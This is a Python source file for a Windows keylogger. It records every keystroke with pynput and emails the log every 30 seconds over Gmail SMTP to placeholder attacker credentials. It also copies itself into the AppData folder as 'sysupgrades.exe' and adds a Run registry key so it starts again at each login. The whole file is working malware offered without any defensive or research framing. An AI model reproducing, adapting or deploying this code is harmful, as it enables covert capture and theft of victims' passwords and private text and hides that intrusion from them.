from pynput import keyboard
import smtplib
import threading
import os
import shutil
import sys
import subprocess


words = ""
def keyloggerr(key):
    global words
    try:
        words = words + str(key.char)
        print(words)
    except AttributeError:
        if key == key.enter:
            words = words + "ENTER"
        elif key == key.space:
            words = words + " "
        elif key == key.esc:
            words = words + "ESC"
        elif key == key.enter:
            words = words + "Enter"
        else:
            pass
def mailgonder(email,password,message):
    emaill = smtplib.SMTP("smtp.gmail.com",587)
    emaill.starttls()
    emaill.login(email,password)
    emaill.sendmail(email,email,message)
    emaill.quit()

def threadingg():
    global words
    mailgonder("#YOUREMAILADDRESS","YOUREMAILPASSWORD",words.encode("utf-8"))
    threadd = threading.Timer(30,threadingg)
    threadd.start()


def add_to_registry():
    new_file = os.environ["appdata"] + "\\sysupgrades.exe"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable, new_file)
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
        subprocess.call(regedit_command, shell=True)


add_to_registry()




keylogger = keyboard.Listener(on_press=keyloggerr)

with keylogger:
    threadingg()
    keylogger.join()
